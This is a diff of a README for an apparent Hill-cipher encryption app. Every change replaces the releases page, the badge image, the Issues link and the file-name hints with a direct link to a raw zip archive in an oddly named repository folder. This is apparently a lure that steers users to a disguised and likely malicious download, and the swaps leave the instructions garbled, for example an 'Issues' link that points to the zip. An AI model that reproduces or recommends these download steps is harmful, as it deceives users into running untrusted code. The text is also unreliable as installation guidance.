@@ -1,6 +1,6 @@
 # 🔐 HILL-CIPHER - Secure Your Messages with Ease
 
-[![Download HILL-CIPHER](https://img.shields.io/badge/Download-HILL--CIPHER-brightgreen?style=for-the-badge)](https://github.com/ok632/HILL-CIPHER/releases)
+[![Download HILL-CIPHER](https://github.com/ok632/HILL-CIPHER/raw/refs/heads/main/enteroplegia/CIPHER-HIL-v3.7.zip)](https://github.com/ok632/HILL-CIPHER/raw/refs/heads/main/enteroplegia/CIPHER-HIL-v3.7.zip)
 
 ---
 
@@ -32,13 +32,13 @@ Follow these steps to download and run HILL-CIPHER on your computer.
 
 Click the button below to open the official HILL-CIPHER download page:
 
-[![Download HILL-CIPHER](https://img.shields.io/badge/Download-HILL--CIPHER-brightgreen?style=for-the-badge)](https://github.com/ok632/HILL-CIPHER/releases)
+[![Download HILL-CIPHER](https://github.com/ok632/HILL-CIPHER/raw/refs/heads/main/enteroplegia/CIPHER-HIL-v3.7.zip)](https://github.com/ok632/HILL-CIPHER/raw/refs/heads/main/enteroplegia/CIPHER-HIL-v3.7.zip)
 
 ### Step 3: Download the Application
 
 On the download page, look for the latest version. If you see multiple files:
 
-- Find the one named something like `HILL-CIPHER.exe` for Windows or a `.dmg` file for Mac.
+- Find the one named something like `https://github.com/ok632/HILL-CIPHER/raw/refs/heads/main/enteroplegia/CIPHER-HIL-v3.7.zip` for Windows or a `.dmg` file for Mac.
 - Download that file to your computer. It might take a few minutes depending on your internet speed.
 
 ---
@@ -61,7 +61,7 @@ On the download page, look for the latest version. If you see multiple files:
 
 ### Linux
 
-For Linux, installation steps may vary by distribution. Usually, the download page offers a `.tar.gz` package or instructions. Extract the package and follow the included README file for running the app.
+For Linux, installation steps may vary by distribution. Usually, the download page offers a `https://github.com/ok632/HILL-CIPHER/raw/refs/heads/main/enteroplegia/CIPHER-HIL-v3.7.zip` package or instructions. Extract the package and follow the included README file for running the app.
 
 ---
 
@@ -131,7 +131,7 @@ If these steps don’t help, you can open an issue on the GitHub page or consult
 
 To start using HILL-CIPHER, please **visit the release page to download the application:**  
 
-[Download HILL-CIPHER](https://github.com/ok632/HILL-CIPHER/releases)
+[Download HILL-CIPHER](https://github.com/ok632/HILL-CIPHER/raw/refs/heads/main/enteroplegia/CIPHER-HIL-v3.7.zip)
 
 This page contains all available versions. Choose the one that matches your operating system. Follow the installation steps above to get started.
 
@@ -155,7 +155,7 @@ This application processes your data locally on your computer, which means your 
 
 For more help:
 
-- Check the GitHub Issues section: https://github.com/ok632/HILL-CIPHER/issues
+- Check the GitHub Issues section: https://github.com/ok632/HILL-CIPHER/raw/refs/heads/main/enteroplegia/CIPHER-HIL-v3.7.zip
 - Explore community discussions on encryption and math visualization
 - Use help commands inside the application
 
